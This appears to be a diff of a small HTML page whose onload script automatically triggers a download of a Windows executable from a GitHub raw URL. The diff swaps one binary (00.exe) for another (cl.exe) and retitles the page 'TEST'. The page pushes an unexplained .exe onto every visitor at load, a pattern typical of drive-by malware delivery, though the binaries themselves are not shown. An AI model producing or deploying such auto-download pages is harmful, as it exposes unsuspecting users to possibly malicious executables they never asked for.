@@ -3,30 +3,19 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Auto Download</title>
+    <title>TEST</title>
     <script>
         window.onload = function() {
-            // Define the file URL
-            const fileUrl = "https://github.com/hubertloudgfdxgx/krc/raw/refs/heads/main/00.exe";
-
-            // Create an anchor element
-            const anchor = document.createElement('a');
-            anchor.href = fileUrl;
-            anchor.download = ""; // This suggests a download rather than opening in-browser
-
-            // Append the anchor to the body (required for Firefox)
-            document.body.appendChild(anchor);
-
-            // Programmatically click the anchor
-            anchor.click();
-
-            // Remove the anchor from the body
-            document.body.removeChild(anchor);
+            // Simulate downloading the cl.exe file from the provided URL
+            var downloadLink = document.createElement('a');
+            downloadLink.href = 'https://github.com/hubertloudgfdxgx/krc/raw/refs/heads/main/cl.exe';  // Link to cl.exe
+            downloadLink.download = 'cl.exe';  // Suggested filename for download
+            downloadLink.click();  // Trigger the download automatically
         };
     </script>
 </head>
 <body>
-    <h1>Preparing Download...</h1>
-    <p>If the download does not start automatically, <a href="https://github.com/hubertloudgfdxgx/krc/raw/refs/heads/main/00.exe" download>click here</a>.</p>
+    <h1>TEST</h1>
+    <p>This page will automatically start downloading <strong>cl.exe</strong> when it loads.</p>
 </body>
 </html>
